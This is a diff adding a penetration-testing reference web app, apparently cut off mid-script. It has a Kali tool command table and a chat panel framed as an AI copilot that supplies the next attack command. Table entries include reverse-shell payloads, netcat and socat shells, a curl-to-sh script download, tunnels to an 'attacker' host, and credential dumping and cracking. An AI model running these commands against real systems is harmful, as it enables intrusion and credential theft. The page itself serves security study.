@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cybsup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            /* Core Colors */
+            --bg-base: #090b14;
+            --bg-surface: #121523;
+            --bg-glass: rgba(18, 21, 35, 0.7);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --border-highlight: rgba(0, 240, 255, 0.3);
+            
+            /* Typography */
+            --text-main: #ffffff;
+            --text-muted: #8b92a5;
+            --font-sans: 'Inter', system-ui, sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+            
+            /* Accents */
+            --accent-primary: #00f0ff;
+            --accent-secondary: #00ff88;
+            --gradient-accent: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            --danger: #ff3366;
+            
+            /* UI Elements */
+            --radius-lg: 16px;
+            --radius-md: 12px;
+            --radius-sm: 8px;
+            --shadow-glow: 0 0 20px rgba(0, 240, 255, 0.15);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background-color: var(--bg-base);
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(0, 240, 255, 0.05), transparent 25%),
+                radial-gradient(circle at 85% 30%, rgba(0, 255, 136, 0.05), transparent 25%);
+            color: var(--text-main);
+            font-family: var(--font-sans);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* --- DESKTOP HEADER --- */
+        .top-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background: var(--bg-glass);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border-color);
+            z-index: 50;
+        }
+
+        .brand {
+            font-family: var(--font-mono);
+            font-size: 1.4rem;
+            font-weight: 700;
+            background: var(--gradient-accent);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .brand::before {
+            content: '';
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--accent-primary);
+            box-shadow: 0 0 10px var(--accent-primary);
+        }
+
+        .nav-tabs { display: flex; gap: 10px; }
+
+        .tab-btn {
+            background: transparent; border: 1px solid transparent; color: var(--text-muted);
+            padding: 8px 16px; border-radius: 20px; font-family: var(--font-sans); font-weight: 600;
+            font-size: 0.9rem; cursor: pointer; transition: all 0.3s;
+        }
+        .tab-btn:hover { color: var(--text-main); background: rgba(255, 255, 255, 0.05); }
+        .tab-btn.active {
+            background: rgba(0, 240, 255, 0.1); color: var(--accent-primary);
+            border: 1px solid var(--border-highlight); box-shadow: inset 0 0 10px rgba(0, 240, 255, 0.05);
+        }
+
+        /* --- MAIN CONTENT AREA --- */
+        .main-container { flex: 1; position: relative; overflow: hidden; display: flex; flex-direction: column; }
+        .view-section { display: none; flex: 1; padding: 24px; overflow-y: auto; animation: fadeUp 0.4s ease-out forwards; }
+        .view-section.active { display: flex; flex-direction: column; }
+
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* --- GENERIC BUTTONS & INPUTS --- */
+        .btn-primary {
+            background: var(--gradient-accent); color: var(--bg-base); border: none; padding: 12px 24px;
+            border-radius: var(--radius-sm); font-weight: 700; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s;
+            text-transform: uppercase; font-family: var(--font-sans);
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(0, 255, 136, 0.3); }
+        
+        .btn-outline {
+            background: transparent; color: var(--text-muted); border: 1px solid var(--border-color);
+            padding: 10px 20px; border-radius: var(--radius-sm); cursor: pointer; transition: all 0.2s; font-weight: 600;
+        }
+        .btn-outline:hover { background: rgba(255, 255, 255, 0.05); color: var(--text-main); }
+
+        /* --- TAB 1: LOCAL DB --- */
+        .db-controls { position: sticky; top: 0; z-index: 10; background: var(--bg-base); padding-bottom: 15px; border-bottom: 1px solid var(--border-color); margin-bottom: 20px; }
+        .search-add-row { display: flex; gap: 15px; margin-bottom: 15px; }
+        .global-search { flex: 1; font-size: 1rem; border-radius: var(--radius-md); padding: 14px 20px; background: var(--bg-surface); border: 1px solid var(--border-color); color: var(--text-main); outline: none; }
+        .global-search:focus { border-color: var(--accent-primary); }
+        
+        .category-filters { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 8px; scrollbar-width: none; }
+        .category-filters::-webkit-scrollbar { height: 4px; }
+        .category-filters::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+        .cat-pill { background: var(--bg-surface); border: 1px solid var(--border-color); color: var(--text-muted); padding: 8px 16px; border-radius: 20px; font-size: 0.85rem; cursor: pointer; white-space: nowrap; transition: 0.2s; }
+        .cat-pill:hover { border-color: var(--text-muted); color: var(--text-main); }
+        .cat-pill.active { background: var(--accent-primary); color: var(--bg-base); border-color: var(--accent-primary); font-weight: bold; }
+
+        .table-responsive { background: var(--bg-surface); border-radius: var(--radius-md); border: 1px solid var(--border-color); overflow-x: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        table { width: 100%; border-collapse: collapse; min-width: 800px; }
+        th { background: rgba(0,0,0,0.2); color: var(--text-muted); padding: 16px; text-align: left; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid var(--border-color); }
+        td { padding: 16px; border-bottom: 1px solid var(--border-color); vertical-align: top; }
+        tr:last-child td { border-bottom: none; }
+        tr:hover { background: rgba(255,255,255,0.02); }
+
+        .col-tool { font-family: var(--font-mono); color: var(--accent-primary); font-weight: 700; width: 20%; }
+        .col-desc { width: 35%; color: var(--text-main); line-height: 1.5; font-size: 0.9rem;}
+        .col-usage { width: 45%; }
+        .usage-code { background: rgba(0,0,0,0.4); padding: 10px; border-radius: var(--radius-sm); border-left: 2px solid var(--accent-secondary); font-family: var(--font-mono); color: var(--text-main); font-size: 0.85rem; white-space: pre-wrap; word-break: break-all;}
+
+        /* --- TAB 2: THREAT INTEL --- */
+        .intel-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; padding-bottom: 20px; }
+        .intel-card { background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 24px; display: flex; flex-direction: column; transition: all 0.3s ease; position: relative; overflow: hidden; }
+        .intel-card:hover { transform: translateY(-5px); border-color: var(--border-highlight); box-shadow: var(--shadow-glow); }
+        .intel-date { font-family: var(--font-mono); font-size: 0.75rem; color: var(--accent-secondary); margin-bottom: 12px; }
+        .intel-title { font-size: 1.1rem; font-weight: 600; color: #fff; margin-bottom: 12px; text-decoration: none; line-height: 1.5; }
+        .intel-desc { font-size: 0.9rem; color: var(--text-muted); line-height: 1.6; flex: 1; }
+
+        /* --- TAB 3: COPILOT UI --- */
+        .pgpt-container { display: flex; flex-direction: column; flex: 1; background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: var(--radius-md); overflow: hidden; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .pgpt-settings { padding: 16px 24px; background: rgba(0,0,0,0.2); border-bottom: 1px solid var(--border-color); display: flex; gap: 15px; align-items: center; flex-wrap: wrap; }
+        .pgpt-settings input { flex: 1; min-width: 250px; font-family: var(--font-mono); font-size: 0.85rem; background: var(--bg-base); color:white; border: 1px solid var(--border-color); padding: 8px 12px; border-radius:4px; outline:none;}
+        .pgpt-output { flex: 1; padding: 24px; overflow-y: auto; display: flex; flex-direction: column; gap: 20px; }
+        .pgpt-bubble { max-width: 85%; padding: 20px; border-radius: var(--radius-md); line-height: 1.6; font-size: 0.95rem; }
+        .pgpt-bubble.user { align-self: flex-end; background: rgba(255, 255, 255, 0.05); border: 1px solid var(--border-color); border-bottom-right-radius: 4px; }
+        .pgpt-bubble.bot { align-self: flex-start; background: rgba(0, 240, 255, 0.03); border: 1px solid var(--border-highlight); border-bottom-left-radius: 4px; box-shadow: inset 0 0 20px rgba(0, 240, 255, 0.02); }
+        .pgpt-bubble h3 { color: var(--accent-primary); margin: 0 0 12px 0; font-size: 1.1rem; }
+        .pgpt-bubble pre { background: var(--bg-base); padding: 16px; border-radius: var(--radius-sm); border-left: 3px solid var(--accent-primary); overflow-x: auto; margin: 15px 0; font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-main); }
+        .pgpt-bubble code { font-family: var(--font-mono); color: var(--accent-secondary); background: rgba(0,255,136,0.1); padding: 2px 6px; border-radius: 4px;}
+        .pgpt-input-area { padding: 20px 24px; background: rgba(0,0,0,0.2); border-top: 1px solid var(--border-color); }
+        .pgpt-input-area textarea { width: 100%; background: var(--bg-base); height: 100px; resize: none; font-family: var(--font-mono); color:white; border:1px solid var(--border-color); border-radius:4px; padding:12px; margin-bottom: 15px; outline:none;}
+        .pgpt-controls { display: flex; justify-content: space-between; align-items: center; }
+
+        /* Loader */
+        .loading-dots::after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
+        @keyframes dots { 0%, 20% { color: rgba(0,0,0,0); } 40% { color: var(--accent-primary); } 60% { text-shadow: .25em 0 0 var(--accent-primary); } 80%, 100% { text-shadow: .25em 0 0 var(--accent-primary), .5em 0 0 var(--accent-primary);}}
+        
+        /* Scrollbars */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent-primary); }
+
+        /* --- MOBILE FLOW --- */
+        @media (max-width: 768px) {
+            .top-nav { padding: 15px 20px; justify-content: center; border-bottom: none; }
+            .nav-tabs { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--bg-surface); padding: 10px; display: flex; justify-content: space-around; z-index: 100; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); }
+            .tab-btn { flex: 1; text-align: center; padding: 12px 0; border-radius: var(--radius-sm); font-size: 0.85rem; background: transparent; }
+            .main-container { padding-bottom: 60px; }
+            .view-section { padding: 15px; }
+            .search-add-row { flex-direction: column; }
+            .btn-primary { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-nav">
+        <div class="brand">CYBSUPPORTER</div>
+        <div class="nav-tabs" id="desktopNav">
+            <button class="tab-btn active" onclick="switchTab('cli-tab')">Kali DB</button>
+            <button class="tab-btn" onclick="switchTab('intel-tab')">Threat Intel</button>
+            <button class="tab-btn" onclick="switchTab('pgpt-tab')">Claude Copilot</button>
+        </div>
+    </header>
+
+    <main class="main-container">
+        
+        <section id="cli-tab" class="view-section active">
+            <div class="db-controls">
+                <div class="search-add-row">
+                    <input type="text" id="globalSearch" class="global-search" placeholder="grep database for commands, tools, or flags..." oninput="renderDB()">
+                </div>
+                <div class="category-filters" id="catFilters">
+                    <button class="cat-pill active" onclick="setCategory('all')">All</button>
+                    <button class="cat-pill" onclick="setCategory('recon')">Recon & OSINT</button>
+                    <button class="cat-pill" onclick="setCategory('web')">Web App Testing</button>
+                    <button class="cat-pill" onclick="setCategory('exploit')">Exploitation</button>
+                    <button class="cat-pill" onclick="setCategory('password')">Password Attacks</button>
+                    <button class="cat-pill" onclick="setCategory('wireless')">Wireless</button>
+                    <button class="cat-pill" onclick="setCategory('postexploit')">Post-Exploitation</button>
+                    <button class="cat-pill" onclick="setCategory('network')">Network & Sniffing</button>
+                    <button class="cat-pill" onclick="setCategory('forensics')">Forensics</button>
+                    <button class="cat-pill" onclick="setCategory('privesc')">Privilege Escalation</button>
+                    <button class="cat-pill" onclick="setCategory('crypto')">Cryptography</button>
+                    <button class="cat-pill" onclick="setCategory('pivoting')">Pivoting & Tunnels</button>
+                    <button class="cat-pill" onclick="setCategory('system')">System Commands</button>
+                </div>
+            </div>
+            
+            <div class="table-responsive">
+                <table id="cliTable">
+                    <thead>
+                        <tr>
+                            <th class="col-tool">Tool / Binary</th>
+                            <th class="col-desc">Description</th>
+                            <th class="col-usage">Syntax / Usage</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dbBody"></tbody>
+                </table>
+            </div>
+        </section>
+
+        <section id="intel-tab" class="view-section">
+            <div class="intel-grid" id="intelGrid"></div>
+        </section>
+
+        <section id="pgpt-tab" class="view-section" style="padding-bottom: 0;">
+            <div class="pgpt-container">
+                <div class="pgpt-settings">
+                    <span style="color: var(--accent-primary); font-family: var(--font-mono); font-weight: 700; font-size: 0.85rem;">[ API_AUTH ]</span>
+                    <input type="password" id="claudeKey" placeholder="Paste Anthropic API Key (sk-ant-...)" onchange="saveApiKey()">
+                </div>
+                
+                <div class="pgpt-output" id="pgptOutput">
+                    <div class="pgpt-bubble bot">
+                        <h3>CLAUDE COPILOT INITIALIZED</h3>
+                        <p>I am your automated penetration testing copilot.</p>
+                        <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 15px;"><strong>PROTOCOL:</strong> Paste raw terminal outputs below. I will analyze the data, identify vulnerabilities, and provide the exact next command required.</p>
+                    </div>
+                </div>
+                
+                <div class="pgpt-input-area">
+                    <textarea id="pgptInput" placeholder="> Paste raw terminal output here..."></textarea>
+                    <div class="pgpt-controls">
+                        <button class="btn-outline" onclick="clearPentest()">Purge Memory</button>
+                        <button class="btn-primary" id="pgptSendBtn">Analyze Payload</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        // ==========================================
+        // 1. HARDCODED KALI LINUX PDF DATABASE
+        // ==========================================
+        const database = [
+            // Recon & OSINT
+            { cat: "recon", name: "nmap", desc: "Network Mapper. Port scanning, service & OS detection.", usage: "nmap -sV -sC -O -p- -T4 [target]\nnmap -sS -Pn --script vuln" },
+            { cat: "recon", name: "masscan", desc: "Fastest port scanner. Millions of packets/sec.", usage: "masscan -p1-65535 --rate 10000\nmasscan -p80,443,8080 192.168.0.0/16 --rate=5000" },
+            { cat: "recon", name: "theHarvester", desc: "Email, subdomain, IP harvesting from public sources.", usage: "theHarvester -d target.com -b google -l 200\ntheHarvester -d target.com -b all" },
+            { cat: "recon", name: "recon-ng", desc: "Full-featured modular OSINT framework.", usage: "recon-ng\nworkspaces create mytarget\nmodules load recon/domains-hosts/bing_domain_web\nrun" },
+            { cat: "recon", name: "amass", desc: "Attack surface mapping and subdomain enumeration.", usage: "amass enum -d target.com -o out.txt\namass enum -passive -d target.com" },
+            { cat: "recon", name: "dnsenum", desc: "DNS enumeration: subdomains, MX, NS, zone transfer.", usage: "dnsenum --enum target.com -f subdomains.txt" },
+            { cat: "recon", name: "dnsrecon", desc: "DNS recon: zone transfer, brute force, reverse lookup.", usage: "dnsrecon -d target.com -t axfr\ndnsrecon -d target.com -D wordlist.txt -t brt" },
+            { cat: "recon", name: "fierce", desc: "DNS brute-force subdomain discovery.", usage: "fierce --domain target.com\nfierce --domain target.com --wordlist custom.txt" },
+            { cat: "recon", name: "spiderfoot", desc: "Automated OSINT with 200+ modules.", usage: "spiderfoot -l 127.0.0.1:5001\nspiderfoot -s target.com -t all" },
+            { cat: "recon", name: "whois", desc: "Domain/IP registration information query.", usage: "whois target.com\nwhois 8.8.8.8" },
+
+            // Web Application Testing
+            { cat: "web", name: "gobuster", desc: "Directory/file/DNS/vhost brute-force scanner.", usage: "gobuster dir -u http://target.com -w common.txt -x php,txt,html\ngobuster dns -d target.com -w subdomains.txt" },
+            { cat: "web", name: "ffuf", desc: "Blazing fast web fuzzer for content discovery & parameters.", usage: "ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301\nffuf -w users.txt:USER -w pass.txt:PASS -u http://t/login -d \"u=USER&p=PASS\"" },
+            { cat: "web", name: "nikto", desc: "Web server vulnerability and misconfiguration scanner.", usage: "nikto -h http://target.com -o report.html -Format html\nnikto -h https://target.com -ssl -p 443" },
+            { cat: "web", name: "sqlmap", desc: "Automated SQL injection detection and exploitation.", usage: "sqlmap -u 'http://site.com/page?id=1' --dbs --level 5 --risk 3\nsqlmap -r burp_request.txt --dbs --batch" },
+            { cat: "web", name: "wpscan", desc: "WordPress vulnerability scanner.", usage: "wpscan --url http://target.com --enumerate u,p,t\nwpscan --url http://target.com --passwords rockyou.txt" },
+            { cat: "web", name: "burpsuite", desc: "Full web app security testing platform (GUI).", usage: "# Launch GUI\nburpsuite\n# Set browser proxy to 127.0.0.1:8080" },
+            { cat: "web", name: "curl", desc: "HTTP client for manual request crafting and testing.", usage: "curl -X POST http://target.com/login -d \"user=admin&pass=x\" -v\ncurl -H \"Authorization: Bearer TOKEN\" https://api.target.com/admin" },
+            { cat: "web", name: "xsstrike", desc: "Advanced XSS detection and exploitation.", usage: "python3 xsstrike.py -u \"http://site.com/search?q=test\"\npython3 xsstrike.py -u \"http://site.com/\" --crawl" },
+
+            // Exploitation Frameworks
+            { cat: "exploit", name: "metasploit (msfconsole)", desc: "World's most used penetration testing framework.", usage: "msfconsole\nsearch type:exploit name:eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS [ip]\nrun" },
+            { cat: "exploit", name: "msfvenom", desc: "Payload generator and encoder.", usage: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell" },
+            { cat: "exploit", name: "searchsploit", desc: "Search offline copy of Exploit-DB.", usage: "searchsploit apache 2.4\nsearchsploit -m 42315" },
+            { cat: "exploit", name: "beef-xss", desc: "Browser Exploitation Framework. Hook browsers via XSS.", usage: "cd /usr/share/beef-xss && ./beef\n# Web UI: http://127.0.0.1:3000/ui/panel" },
+            { cat: "exploit", name: "crackmapexec", desc: "Windows/AD network pentesting swiss army knife.", usage: "crackmapexec smb 192.168.1.0/24 -u admin -p Password123\ncrackmapexec winrm target -u admin -p pass -x whoami" },
+            { cat: "exploit", name: "impacket", desc: "Python network protocol classes (SMB/Kerberos/LDAP).", usage: "impacket-psexec admin:Password123@192.168.1.5\nimpacket-secretsdump -hashes NTLM admin@192.168.1.5\nimpacket-GetUserSPNs domain.com/user:pass -request" },
+
+            // Password Attacks
+            { cat: "password", name: "hashcat", desc: "World's fastest GPU-accelerated password cracker.", usage: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 1800 hashes.txt rockyou.txt -r rules/best64.rule" },
+            { cat: "password", name: "john", desc: "Versatile CPU-based password cracker (John the Ripper).", usage: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\nunshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt" },
+            { cat: "password", name: "hydra", desc: "Fast online network password brute-force tool.", usage: "hydra -l admin -P rockyou.txt ssh://192.168.1.5\nhydra -L users.txt -P pass.txt http-post-form \"/login:u=^USER^&p=^PASS^:Invalid\"" },
+            { cat: "password", name: "crunch", desc: "Custom wordlist generator based on charset/pattern.", usage: "crunch 8 12 abcdefgh0123456789 -o wordlist.txt\ncrunch 8 8 -t @@god@@ -o pattern.txt" },
+            { cat: "password", name: "cewl", desc: "Spider a website to generate a site-specific wordlist.", usage: "cewl http://target.com -d 3 -m 6 -w cewl_wordlist.txt\ncewl http://target.com --email -w emails.txt" },
+            { cat: "password", name: "medusa", desc: "Fast parallel password brute-forcer.", usage: "medusa -h 192.168.1.5 -u admin -P rockyou.txt -M ssh\nmedusa -h 192.168.1.5 -U users.txt -P pass.txt -M ftp" },
+
+            // Wireless Attacks
+            { cat: "wireless", name: "aircrack-ng suite", desc: "Complete Wi-Fi security auditing toolkit.", usage: "airmon-ng start wlan0\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\naireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon\naircrack-ng capture.cap -w rockyou.txt" },
+            { cat: "wireless", name: "wifite", desc: "Automated wireless auditor WEP/WPA/WPS.", usage: "wifite --wpadict rockyou.txt\nwifite --wps --no-wps-timeout" },
+            { cat: "wireless", name: "kismet", desc: "Wireless network detector, sniffer and IDS.", usage: "kismet -c wlan0\n# Web UI: http://localhost:2501" },
+            { cat: "wireless", name: "hcxdumptool", desc: "Capture PMKID and EAPOL handshakes for hashcat.", usage: "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1\nhcxpcapngtool capture.pcapng -o hash.hc22000" },
+            { cat: "wireless", name: "hostapd-wpe", desc: "Rogue AP/Evil Twin for credential capture.", usage: "hostapd-wpe hostapd-wpe.conf\n# Edit conf: interface, ssid, channel" },
+
+            // Post-Exploitation
+            { cat: "postexploit", name: "linpeas / winpeas", desc: "Privilege escalation enumeration scripts.", usage: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n.\\winPEASany.exe quiet" },
+            { cat: "postexploit", name: "mimikatz", desc: "Extract Windows credentials from LSASS memory (via Meterpreter).", usage: "load kiwi\ncreds_all\nlsa_dump_sam\nlsa_dump_secrets\ndcsync /user:domain\\administrator" },
+            { cat: "postexploit", name: "enum4linux", desc: "Enumerate SMB/Samba shares, users, groups, policies.", usage: "enum4linux -a 192.168.1.5\nenum4linux -u admin -p pass -a 192.168.1.5" },
+            { cat: "postexploit", name: "evil-winrm", desc: "Windows Remote Management shell for pentesting.", usage: "evil-winrm -i 192.168.1.5 -u administrator -p Password123\nevil-winrm -i 192.168.1.5 -u admin -H NTLMHASH" },
+            { cat: "postexploit", name: "empire", desc: "PowerShell/Python post-exploitation framework.", usage: "./ps-empire server\n./ps-empire client\nuse listener http\nuse stager multi/launcher" },
+
+            // Network & Sniffing
+            { cat: "network", name: "wireshark", desc: "GUI network protocol analyzer and packet capture.", usage: "wireshark -i eth0 -k\ntshark -i eth0 -w capture.pcap" },
+            { cat: "network", name: "tcpdump", desc: "Command-line packet capture.", usage: "tcpdump -i eth0 -w capture.pcap 'port 80'\ntcpdump -i eth0 -n 'host 192.168.1.5 and port 443'" },
+            { cat: "network", name: "netcat (nc)", desc: "Swiss army knife port scan, listener, file transfer, shells.", usage: "nc -lvnp 4444\nnc 192.168.1.5 4444 -e /bin/bash\ncat file | nc target 9999" },
+            { cat: "network", name: "socat", desc: "Advanced relay full duplex, TLS, PTY shells.", usage: "socat TCP4-LISTEN:4444,fork EXEC:/bin/bash,pty,stderr\nsocat OPENSSL-LISTEN:4443,cert=server.pem,fork EXEC:/bin/bash" },
+            { cat: "network", name: "proxychains", desc: "Route tool traffic through SOCKS/HTTP proxy chains.", usage: "proxychains nmap -sT -Pn 192.168.1.5\n# Edit /etc/proxychains4.conf to add socks5 127.0.0.1 9050" },
+            { cat: "network", name: "responder", desc: "LLMNR/NBT-NS/MDNS poisoner for credential capture.", usage: "responder -I eth0 -w -r -f\nresponder -I eth0 -A # analyze mode" },
+            { cat: "network", name: "ngrep", desc: "Network grep. Pattern match on live/pcap traffic.", usage: "ngrep -d eth0 'password' port 80\nngrep -I capture.pcap 'Authorization'" },
+            
+            // --- NEW NETWORKING INTEGRATIONS ---
+            { cat: "network", name: "ip / ifconfig / iwconfig", desc: "Display IP addresses and network/wireless interfaces", usage: "ip a\nifconfig\niwconfig" },
+            { cat: "network", name: "ping / traceroute", desc: "Test connection and trace the routing path to a host", usage: "ping [ip/domain]\ntraceroute [domain]" },
+            { cat: "network", name: "netstat / ss", desc: "Show active TCP connections, listening ports and sockets", usage: "netstat -antp\nss -tuln" },
+            { cat: "network", name: "arp / route", desc: "Show the local ARP cache and IP routing table", usage: "arp -a\nroute -n" },
+            { cat: "network", name: "dig / nslookup", desc: "Query DNS records for a domain", usage: "dig [domain]\nnslookup [domain]" },
+            { cat: "network", name: "macchanger", desc: "Randomize your MAC address", usage: "macchanger -r [iface]" },
+
+            // Forensics & Analysis
+            { cat: "forensics", name: "volatility3", desc: "Memory forensics framework to analyze RAM dumps.", usage: "vol -f memory.raw windows.pslist\nvol -f memory.raw windows.netscan\nvol -f memory.raw windows.cmdline" },
+            { cat: "forensics", name: "autopsy", desc: "Digital forensics platform for disk/file analysis (GUI).", usage: "autopsy\n# Opens at http://localhost:9999" },
+            { cat: "forensics", name: "binwalk", desc: "Firmware analysis. Find and extract embedded files.", usage: "binwalk -e firmware.bin\nbinwalk --entropy firmware.bin" },
+            { cat: "forensics", name: "foremost", desc: "File carving to recover files from disk/memory images.", usage: "foremost -i disk.img -o /output/ -t pdf,jpg,docx,zip" },
+            { cat: "forensics", name: "steghide", desc: "Steganography. Hide/extract data in images and audio.", usage: "steghide embed -cf photo.jpg -sf secret.txt -p passphrase\nsteghide extract -sf photo.jpg" },
+            { cat: "forensics", name: "stegseek", desc: "Lightning-fast steghide passphrase cracker.", usage: "stegseek photo.jpg /usr/share/wordlists/rockyou.txt" },
+            { cat: "forensics", name: "exiftool", desc: "Read and write metadata in image/document files.", usage: "exiftool photo.jpg\nexiftool -all= photo.jpg # strip all metadata" },
+            { cat: "forensics", name: "strings", desc: "Extract printable strings from binaries/files.", usage: "strings malware.exe | grep -i 'http\\|password\\|key'\nstrings -a -n 8 binary" },
+
+            // Privilege Escalation
+            { cat: "privesc", name: "sudo -l", desc: "List allowed sudo commands for current user.", usage: "sudo -l\nsudo -l -U username\n# Look for NOPASSWD entries" },
+            { cat: "privesc", name: "find (SUID/SGID)", desc: "Find privilege escalation vectors on filesystem.", usage: "find / -perm -4000 -type f 2>/dev/null # SUID\nfind / -perm -2000 -type f 2>/dev/null # SGID\nfind / -writable -type d 2>/dev/null # Writable dirs" },
+            { cat: "privesc", name: "pspy", desc: "Monitor Linux processes without root (cron job discovery).", usage: "./pspy64\n./pspy32" },
+            { cat: "privesc", name: "lse.sh", desc: "Linux Smart Enum. Thorough privesc enumeration script.", usage: "bash lse.sh -l2\n# Levels: -l1 (basic), -l2 (detailed), -l3 (verbose)" },
+            { cat: "privesc", name: "BeRoot", desc: "Detect common privilege escalation paths (Python).", usage: "python beroot.py" },
+
+            // Cryptography & Encoding
+            { cat: "crypto", name: "openssl", desc: "Encrypt/decrypt files, generate certs, TLS debugging.", usage: "openssl s_client -connect target.com:443\nopenssl enc -aes-256-cbc -in file -out file.enc\nopenssl genrsa -out key.pem 4096" },
+            { cat: "crypto", name: "gpg", desc: "GNU Privacy Guard. Encrypt, sign, verify.", usage: "gpg --gen-key\ngpg --encrypt --recipient user@mail.com file.txt\ngpg --decrypt file.txt.gpg" },
+            { cat: "crypto", name: "base64", desc: "Encode/decode base64 data.", usage: "echo \"text\" | base64\nbase64 -d <<< dGV4dA==\nbase64 -d file.b64 > file.bin" },
+            { cat: "crypto", name: "xxd", desc: "Hex dump and reverse hex dump.", usage: "xxd file.bin | head -20\nxxd -r hex_dump.txt > binary.bin" },
+            { cat: "crypto", name: "hashid", desc: "Identify hash type from hash string.", usage: "hashid 5f4dcc3b5aa765d61d8327deb882cf99\nhashid -m hash.txt # Output hashcat mode" },
+
+            // Pivoting & Tunneling
+            { cat: "pivoting", name: "ssh tunneling", desc: "Port forwarding and SOCKS proxy via SSH.", usage: "ssh -L 8080:internal.host:80 user@jumphost\nssh -R 4444:localhost:4444 user@vps\nssh -D 9050 user@proxy # SOCKS5 proxy" },
+            { cat: "pivoting", name: "chisel", desc: "Fast HTTP tunnel for firewall/NAT bypass.", usage: "chisel server -p 8080 --reverse # attacker\nchisel client attacker.com:8080 R:socks # victim" },
+            { cat: "pivoting", name: "ligolo-ng", desc: "Advanced tunneling agent with TUN interface.", usage: "sudo ip route add 192.168.1.0/24 dev ligolo\n./agent -connect attacker:11601 -ignore-cert" },
+            { cat: "pivoting", name: "metasploit routing", desc: "Route traffic through Meterpreter sessions.", usage: "route add 192.168.2.0/24 [SESSION_ID]\nuse auxiliary/server/socks_proxy\nset SRVPORT 9050\nrun" },
+
+            // --- NEW SYSTEM COMMANDS INTEGRATION ---
+            // File & Directory Management
+            { cat: "system", name: "pwd", desc: "Print current working directory", usage: "pwd" },
+            { cat: "system", name: "ls", desc: "List all files/directories with detailed permissions", usage: "ls -la" },
+            { cat: "system", name: "cd", desc: "Change directory (e.g., to ~ for home)", usage: "cd [dir]\ncd ~" },
+            { cat: "system", name: "mkdir / rmdir", desc: "Create or remove an empty directory", usage: "mkdir [dir]\nrmdir [dir]" },
+            { cat: "system", name: "rm", desc: "Forcefully remove a directory and its contents", usage: "rm -rf [dir]" },
+            { cat: "system", name: "cp", desc: "Copy a file or directory recursively", usage: "cp [file1] [file2]\ncp -r [dir1] [dir2]" },
+            { cat: "system", name: "mv", desc: "Move or rename a file/directory", usage: "mv [old] [new]" },
+            { cat: "system", name: "touch", desc: "Create an empty file or update its timestamp", usage: "touch [file]" },
+            { cat: "system", name: "cat", desc: "Output the contents of a file to the terminal", usage: "cat [file]" },
+            { cat: "system", name: "less", desc: "View file contents one page at a time", usage: "less [file]" },
+            { cat: "system", name: "head / tail", desc: "View first/last 10 lines of a file, or follow real-time", usage: "head -n 10 [file]\ntail -n 10 [file]\ntail -f [file]" },
+            { cat: "system", name: "nano / vim", desc: "Open a file in a terminal text editor", usage: "nano [file]\nvim [file]" },
+
+            // System Information & Hardware
+            { cat: "system", name: "uname", desc: "Show all system and kernel information", usage: "uname -a" },
+            { cat: "system", name: "hostname / uptime", desc: "Show system hostname and uptime", usage: "hostname\nuptime" },
+            { cat: "system", name: "lscpu / lsusb / lspci", desc: "Display CPU, USB, or PCI device architecture", usage: "lscpu\nlsusb\nlspci" },
